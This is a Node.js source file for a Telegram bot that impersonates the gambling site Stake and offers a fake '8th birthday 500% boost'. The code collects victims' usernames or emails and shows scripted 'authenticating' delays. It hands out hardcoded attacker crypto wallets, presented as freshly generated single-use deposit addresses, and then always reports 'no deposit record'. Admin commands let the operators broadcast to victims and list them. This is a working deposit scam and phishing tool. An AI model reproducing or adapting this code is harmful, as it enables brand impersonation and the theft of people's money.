const { Telegraf } = require('telegraf');
require('dotenv').config();

const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
  console.error('❌ BOT_TOKEN missing in .env');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const users = {};
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// Payment options
const paymentOptions = {
  BTC: {
    type: "multi",
    networks: {
      BEP20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff",
      ERC20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff"
    }
  },
  ETH: {
    type: "multi",
    networks: {
      BEP20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff",
      ERC20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff"
    }
  },
  USDT: {
    type: "multi",
    networks: {
      TRC20: "TBJFsdbnVntRGcdk3bkpguyCnd3KdvEafn",
      ERC20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff",
      BEP20: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff"
    }
  },
  LTC: { type: "single", address: "LYWFAgqd7k71YckSLtLVQWsozd2Tns9iFw" },
  SOL: { type: "single", address: "ECdHtnUzaJdRVArasUdMebq47gK1gYoCF12yFrvKDxnh" },
  TRX: { type: "single", address: "TBJFsdbnVntRGcdk3bkpguyCnd3KdvEafn" },
  BNB: { type: "single", address: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff" },
  USDC: { type: "single", address: "0x0655cfb0275c265a847640276cbba8bb8f80c8ff" }
};

// Start message
bot.start(async (ctx) => {
  await ctx.replyWithPhoto(
    { source: "photo_2025-08-25_16-31-17.jpg" },
    {
      caption: `Stake official bonuses bot.

🎁 Stay updated for the latest exclusive bonuses available for every Stake user.

🚀 Don't miss out - boost your winnings & gaming experience to the next level.

✅ Trusted by more than 100,000,000 daily users worldwide.`,
      reply_markup: {
        inline_keyboard: [
          [{ text: "Check Bonus", callback_data: "check_bonus" }]
        ]
      }
    }
  );
});

// Bonus message
bot.action('check_bonus', async (ctx) => {
  await ctx.replyWithPhoto(
    { source: "photo_2025-08-17_04-20-43.jpg" },
    {
      caption: `🎂 Stake's 8th birthday 500% boost event.

💎 Min-Max Deposit: $100 - $3000
🎰 Wagering Requirement: None

To celebrate our 8th birthday with you, we are rolling out incredible 5x boost on your first top-up.

Feeling lucky - boost now 🚀`,
      reply_markup: {
        inline_keyboard: [
          [{ text: "Boost Now", callback_data: "boost_now" }]
        ]
      }
    }
  );
});

bot.action('boost_now', async (ctx) => {
  await ctx.reply(`Step 1: Choose your platform

To activate your boost, we need to know which platform do you play on.
Stake.com
Stake.us`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Stake.com", callback_data: "platform_com" }, { text: "Stake.us", callback_data: "platform_us" }]
      ]
    }
  });
});

bot.action(/platform_/, async (ctx) => {
  const userId = ctx.from.id;
  users[userId] = { platform: ctx.match[0].split('_')[1] };
  await ctx.reply(`Step 2: Link your Stake account

🌐 Connect your Stake account to assign the boost.

❗️ To avoid loss of funds & delays, make sure you entered correct information.

We will never ask for your password & personal info.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "👤 Connect With Username", callback_data: "link_username" }],
        [{ text: "📧 Connect With E-mail Address", callback_data: "link_email" }]
      ]
    }
  });
});

bot.action(['link_username','link_email'], async (ctx) => {
  const userId = ctx.from.id;
  users[userId].linkType = ctx.match[0];
  await ctx.reply(`Step 3: Enter your Stake ${ctx.match[0]==='link_username'?'username':'email'}

🔑 Your account will be linked with Stake bot to activate your boost.

To claim your 500% boost, enter your Stake ${ctx.match[0]==='link_username'?'username':'email'} below ⬇️`);
});

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  if(!users[userId] || !users[userId].linkType || users[userId].linked) return;
  users[userId].linkedValue = ctx.message.text;

  await ctx.reply('🔁 Connecting to Stake\'s user database...please wait');
  await sleep(3000);
  await ctx.reply('Fetching server data...');
  await sleep(3000);
  await ctx.reply('Verifying...');
  await sleep(3000);
  await ctx.reply('Authenticating...');
  await sleep(4000);
  await ctx.reply(`Success!\n\nYour Stake account has been linked successfully.\n\n👤 Stake account: ${ctx.message.text}`);
  await ctx.reply('Continue ➡', {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Continue", callback_data: "continue_after_link" }]
      ]
    }
  });
  users[userId].linked = true;
});

bot.action('continue_after_link', async (ctx) => {
  const userId = ctx.from.id;
  const account = users[userId].linkedValue;

  await ctx.reply('Step 4: Completed!\n\n🎉 Congratulations, your 500% Stake 8th birthday boost is now active!\n\n💵 Deposit any amount between $100 - $3000 and instantly receive 5x your funds - no wager requirements.\n\n(Example: Deposit $300 get $1500 credited to your Stake account)\n\nThis bonus can only be claimed once.');

  await sleep(2000);
  await ctx.reply(`💱 Select cryptocurrency you want to deposit.

👤 Linked Stake account: ${account}

This will be connected to your bonus address & used to credit your reward.

🔐 Fast, secure & reliable transactions.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "BTC", callback_data: "currency_BTC" }, { text: "ETH", callback_data: "currency_ETH" }],
        [{ text: "LTC", callback_data: "currency_LTC" }, { text: "SOL", callback_data: "currency_SOL" }],
        [{ text: "BNB", callback_data: "currency_BNB" }, { text: "TRX", callback_data: "currency_TRX" }],
        [{ text: "USDT", callback_data: "currency_USDT" }, { text: "USDC", callback_data: "currency_USDC" }]
      ]
    }
  });
});

// Handle currencies
bot.action(/currency_(.+)/, async (ctx) => {
  const userId = ctx.from.id;
  const currency = ctx.match[1];

  const option = paymentOptions[currency];
  if (!option) {
    return ctx.reply("❌ Currency not available.");
  }

  if (option.type === "single") {
    await ctx.reply(`✅ You selected ${currency}`);
    await ctx.reply(`Generating single-use crypto address associated with Stake account: ${users[userId]?.linkedValue || "Unknown"}`);
    await sleep(4000);
    await ctx.reply(`✅ Your single-use ${currency} address has been generated successfully!`);
    await sleep(1000);
    await ctx.reply(`💳 Deposit Address:\n\`${option.address}\``, { parse_mode: "Markdown" });
  } else if (option.type === "multi") {
    const networks = Object.keys(option.networks).map(n => [{ text: n, callback_data: `network_${currency}_${n}` }]);
    await ctx.reply(`✅ You selected ${currency}\n\n🌐 Please choose a network:`, {
      reply_markup: { inline_keyboard: networks }
    });
  }
});

// Handle networks
bot.action(/network_(.+)_(.+)/, async (ctx) => {
  const userId = ctx.from.id;
  const currency = ctx.match[1];
  const network = ctx.match[2];
  const option = paymentOptions[currency];
  const account = users[userId]?.linkedValue || "Unknown";

  if (!option || !option.networks[network]) {
    return ctx.reply("❌ Network not available.");
  }

  await ctx.reply(`✅ You selected ${currency} via ${network}`);
  await ctx.reply(`Generating single-use crypto address associated with Stake account: ${account}`);
  await sleep(4000);
  await ctx.reply(`✅ Your single-use ${currency} (${network}) address has been generated successfully!`);
  await sleep(1000);
  await ctx.reply(`💳 Deposit Address:\n\`${option.networks[network]}\``, { parse_mode: "Markdown" });

  await sleep(1500);
  await ctx.reply(`🔀 Your deposit will appear on your Stake account 'Transactions' page once blockchain confirms the transaction. Avg. waiting time - 3min.\n\n🟢 Click the button below to confirm your deposit.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Confirm", callback_data: `confirm_${currency}_${network}` }]
      ]
    }
  });
});

// Confirm deposit
bot.action(/confirm_(.+)_(.+)/, async (ctx) => {
  const userId = ctx.from.id;
  const account = users[userId]?.linkedValue || "Unknown";

  await ctx.reply(`🎁 Thank you for participating in our Stake bonus event. Hope to see you soon for more upcoming boosts & even bigger wins.

💯 After clicking on 'Complete' button, your deposit bonus will be credited to your Stake account: ${account} once blockchain records the transaction.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Complete", callback_data: "complete_bonus" }]
      ]
    }
  });
});

// Complete flow
bot.action("complete_bonus", async (ctx) => {
  await ctx.reply(`What would you like to do?`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Check Status", callback_data: "check_status" }],
        [{ text: "Contact", callback_data: "contact" }],
        [{ text: "Terms", callback_data: "terms" }],
        [{ text: "Reset", callback_data: "reset" }]
      ]
    }
  });
});

// Check status
bot.action("check_status", async (ctx) => {
  const userId = ctx.from.id;
  const account = users[userId]?.linkedValue || "Unknown";

  await ctx.reply("Connecting to gateway...");
  await sleep(5000);
  await ctx.reply(`Checking deposit bonus status for Stake account: ${account}`);
  await sleep(2000);
  await ctx.reply(`No deposit record found for user: ${account}`);
  await sleep(1500);
  await ctx.reply(`❌ STATUS: (No deposit record)\n\nMake sure you followed all the steps correctly.`);
});

// Terms
bot.action("terms", async (ctx) => {
  await ctx.reply(`https://stake.com/policies/terms

Stake (https://stake.com/policies/terms)

Terms of Service - Read T&C's Online at Stake.com

Our terms and conditions include terms of service, important notices, warranties and more. Read all our policies and important information at Stake.com.`);
});

// Contact
bot.action("contact", async (ctx) => {
  await ctx.reply("📩 For any issues or inquiries, please contact our support team at support@stake.com or visit https://stake.com/contact");
});

// Reset
bot.action("reset", async (ctx) => {
  delete users[ctx.from.id];
  await ctx.reply("🔄 Reset completed. Please /start again to begin from the start.");
});

// ==========================
// Admin System
// ==========================

// Admin IDs
const admins = [7178026661, 5586850736];

// Function to check admin
function isAdmin(userId) {
  return admins.includes(userId);
}

// Broadcast command
bot.command('broadcast', async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }

  const message = ctx.message.text.split(' ').slice(1).join(' ');
  if (!message) return ctx.reply("⚠️ Please provide a message to broadcast.");

  let count = 0;
  for (let id in users) {
    try {
      await bot.telegram.sendMessage(id, `📢 Broadcast:\n\n${message}`);
      count++;
    } catch (e) {
      console.log(`Failed to send to ${id}`);
    }
  }

  ctx.reply(`✅ Broadcast sent successfully to ${count} users.`);
});

// Reset user command
bot.command('resetuser', async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }

  const parts = ctx.message.text.split(' ');
  if (parts.length < 2) return ctx.reply("⚠️ Usage: /resetuser <user_id>");

  const targetId = parts[1];
  if (users[targetId]) {
    delete users[targetId];
    ctx.reply(`✅ User ${targetId} has been reset.`);
  } else {
    ctx.reply(`⚠️ User ${targetId} not found in database.`);
  }
});

// List users command
bot.command('listusers', async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }

  const ids = Object.keys(users);
  if (ids.length === 0) return ctx.reply("⚠️ No users in database.");

  ctx.reply(`👥 Users registered:\n${ids.join('\n')}`);
});

// Stats command
bot.command('stats', async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to use this command.");
  }

  const totalUsers = Object.keys(users).length;
  const linkedUsers = Object.values(users).filter(u => u.linked).length;

  ctx.reply(`📊 Bot Stats:\n\n👥 Total users: ${totalUsers}\n🔗 Linked accounts: ${linkedUsers}`);
});

bot.launch();
console.log('✅ Stake Bonus Bot running...');
